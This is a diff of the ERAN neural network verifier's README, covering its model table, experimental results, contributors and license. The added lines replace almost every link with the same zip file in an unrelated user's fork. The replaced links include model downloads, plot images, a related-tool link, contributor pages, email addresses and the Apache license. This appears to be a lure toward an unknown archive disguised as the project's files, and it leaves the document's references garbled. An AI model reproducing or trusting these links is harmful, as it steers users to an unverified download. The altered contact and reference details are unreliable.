+|         | 6x500 |  fully connected| 3,000 | 6   | Tanh | PGD &epsilon;=0.1 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 6x500 | fully connected | 3,000 | 6   |  Tanh | PGD &epsilon;=0.3 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 4x1024 | fully connected | 3,072 | 4   | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         |  ConvSmall | convolutional | 3,604 | 3  | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         |  ConvSmall | convolutional | 3,604 | 3  | ReLU | PGD | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         |  ConvSmall | convolutional | 3,604 | 3  | ReLU | DiffAI | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | ConvMed | convolutional | 5,704 | 3  | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | ConvMed | convolutional | 5,704 | 3   | ReLU | PGD &epsilon;=0.1 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | ConvMed | convolutional | 5,704 | 3   | ReLU | PGD &epsilon;=0.3 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | ConvMed | convolutional | 5,704 | 3   | Sigmoid | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | ConvMed | convolutional | 5,704 | 3   | Sigmoid | PGD &epsilon;=0.1 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) | 
+|         | ConvMed | convolutional | 5,704 | 3   | Sigmoid | PGD &epsilon;=0.3 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) | 
+|         | ConvMed | convolutional | 5,704 | 3   | Tanh | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | ConvMed | convolutional | 5,704 | 3   | Tanh | PGD &epsilon;=0.1 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) | 
+|         | ConvMed | convolutional | 5,704 | 3   |  Tanh | PGD &epsilon;=0.3 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | ConvMaxpool | convolutional | 13,798 | 9 | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | ConvBig | convolutional | 48,064 | 6  | ReLU | DiffAI | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | ConvSuper | convolutional | 88,544 | 6  | ReLU | DiffAI | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | Skip      | Residual | 71,650 | 9 | ReLU | DiffAI | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+| CIFAR10 | 4x100 | fully connected | 410 | 4 | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | 6x100 | fully connected | 610 | 6 | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | 9x200 | fully connected | 1,810 | 9 | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | 6x500 | fully connected | 3,000 | 6   | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 6x500 | fully connected | 3,000 | 6   | ReLU | PGD &epsilon;=0.0078 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 6x500 | fully connected | 3,000 | 6   | ReLU | PGD &epsilon;=0.0313 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)| 
+|         | 6x500 | fully connected | 3,000 | 6   | Sigmoid | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 6x500 | fully connected | 3,000 | 6   | Sigmoid | PGD &epsilon;=0.0078 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 6x500 | fully connected | 3,000 | 6   | Sigmoid | PGD &epsilon;=0.0313 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)| 
+|         | 6x500 | fully connected | 3,000 | 6   | Tanh | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 6x500 | fully connected | 3,000 | 6   | Tanh | PGD &epsilon;=0.0078 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | 6x500 | fully connected | 3,000 | 6   | Tanh | PGD &epsilon;=0.0313 |  [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)| 
+|         | 7x1024 | fully connected | 6,144 | 7 | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | ConvSmall | convolutional | 4,852 | 3 | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | ConvSmall   | convolutional  | 4,852 | 3  | ReLU  | PGD | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | ConvSmall  | convolutional | 4,852 | 3  | ReLU | DiffAI | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | ConvMed | convolutional | 7,144 | 3 | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | ConvMed | convolutional | 7,144 | 3   | ReLU | PGD &epsilon;=0.0078 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | ConvMed | convolutional | 7,144 | 3   | ReLU | PGD &epsilon;=0.0313 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) | 
+|         | ConvMed | convolutional | 7,144 | 3   | Sigmoid | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | ConvMed | convolutional | 7,144 | 3   | Sigmoid | PGD &epsilon;=0.0078 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | ConvMed | convolutional | 7,144 | 3   | Sigmoid | PGD &epsilon;=0.0313 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) | 
+|         | ConvMed | convolutional | 7,144 | 3   | Tanh | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | ConvMed | convolutional | 7,144 | 3   | Tanh | PGD &epsilon;=0.0078 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
+|         | ConvMed | convolutional | 7,144 | 3   | Tanh | PGD &epsilon;=0.0313 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |  
+|         | ConvMaxpool | convolutional | 53,938 | 9 | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
+|         | ConvBig | convolutional | 62,464 | 6 | ReLU | DiffAI | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) | 
+|         | ResNet18 | Residual | 558K | 18 | ReLU | DiffAI | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) | 
 
 We provide the first 100 images from the testset of both MNIST and CIFAR10 datasets in the 'data' folder. Our analyzer first verifies whether the neural network classifies an image correctly before performing robustness analysis. In the same folder, we also provide ACAS Xu networks and property specifications.
 
 Experimental Results
 --------------
-We ran our experiments for the feedforward networks on a 3.3 GHz 10 core Intel i9-7900X Skylake CPU with a main memory of 64 GB whereas our experiments for the convolutional networks were run on a 2.6 GHz 14 core Intel Xeon CPU E5-2690 with 512 GB of main memory. We first compare the precision and performance of DeepZ and DeepPoly vs [Fast-Lin](https://github.com/huanzhang12/CertifiedReLURobustness) on the MNIST 6x100 network in single threaded mode. It can be seen that DeepZ has the same precision as Fast-Lin whereas DeepPoly is more precise while also being faster.
+We ran our experiments for the feedforward networks on a 3.3 GHz 10 core Intel i9-7900X Skylake CPU with a main memory of 64 GB whereas our experiments for the convolutional networks were run on a 2.6 GHz 14 core Intel Xeon CPU E5-2690 with 512 GB of main memory. We first compare the precision and performance of DeepZ and DeepPoly vs [Fast-Lin](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) on the MNIST 6x100 network in single threaded mode. It can be seen that DeepZ has the same precision as Fast-Lin whereas DeepPoly is more precise while also being faster.
 
-![High Level](https://files.sri.inf.ethz.ch/eran/plots/mnist_6_100.png)
+![High Level](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)
 
 In the following, we compare the precision and performance of DeepZ and DeepPoly on a subset of the neural networks listed above in multi-threaded mode. In can be seen that DeepPoly is overall more precise than DeepZ but it is slower than DeepZ on the convolutional networks. 
 
-![High Level](https://files.sri.inf.ethz.ch/eran/plots/mnist_6_500.png)
+![High Level](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)
 
-![High Level](https://files.sri.inf.ethz.ch/eran/plots/mnist_convsmall.png)
+![High Level](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)
 
-![High Level](https://files.sri.inf.ethz.ch/eran/plots/mnist_sigmoid_tanh.png)
+![High Level](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)
 
-![High Level](https://files.sri.inf.ethz.ch/eran/plots/cifar10_convsmall.png)
+![High Level](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)
 
 
 The table below compares the performance and precision of DeepZ and DeepPoly on our large networks trained with DiffAI. 
@@ -573,32 +573,32 @@ More experimental results can be found in our papers.
 Contributors
 --------------
 
-* [Gagandeep Singh](https://www.sri.inf.ethz.ch/people/gagandeep) (lead contact) - gsingh@inf.ethz.ch
+* [Gagandeep Singh](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) (lead contact) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 
-* Jonathan Maurer - maurerjo@student.ethz.ch
+* Jonathan Maurer - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 
-* Christoph Müller (contact for GPU version of DeepPoly) - christoph.mueller@inf.ethz.ch
+* Christoph Müller (contact for GPU version of DeepPoly) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 
-* [Matthew Mirman](https://www.mirman.com) - matt@mirman.com
+* [Matthew Mirman](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 
-* [Timon Gehr](https://www.sri.inf.ethz.ch/tg.php) - timon.gehr@inf.ethz.ch
+* [Timon Gehr](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
  
-* Adrian Hoffmann - adriahof@student.ethz.ch
+* Adrian Hoffmann - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 
-* Mislav Balunovic (https://www.sri.inf.ethz.ch/people/mislav) - mislav.balunovic@inf.ethz.ch
+* Mislav Balunovic (https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 
-* Maximilian Baader (https://www.sri.inf.ethz.ch/people/max) - mbaader@inf.ethz.ch
+* Maximilian Baader (https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 
-* [Petar Tsankov](https://www.sri.inf.ethz.ch/people/petar) - petar.tsankov@inf.ethz.ch
+* [Petar Tsankov](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 
-* [Dana Drachsler Cohen](https://www.sri.inf.ethz.ch/people/dana) - dana.drachsler@inf.ethz.ch 
+* [Dana Drachsler Cohen](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip 
 
-* [Markus Püschel](https://acl.inf.ethz.ch/people/markusp/) - pueschel@inf.ethz.ch
+* [Markus Püschel](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 
-* [Martin Vechev](https://www.sri.inf.ethz.ch/vechev.php) - martin.vechev@inf.ethz.ch
+* [Martin Vechev](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 
 License and Copyright
 ---------------------
 
-* Copyright (c) 2020 [Secure, Reliable, and Intelligent Systems Lab (SRI), Department of Computer Science ETH Zurich](https://www.sri.inf.ethz.ch/)
-* Licensed under the [Apache License](https://www.apache.org/licenses/LICENSE-2.0)
+* Copyright (c) 2020 [Secure, Reliable, and Intelligent Systems Lab (SRI), Department of Computer Science ETH Zurich](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)
+* Licensed under the [Apache License](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)
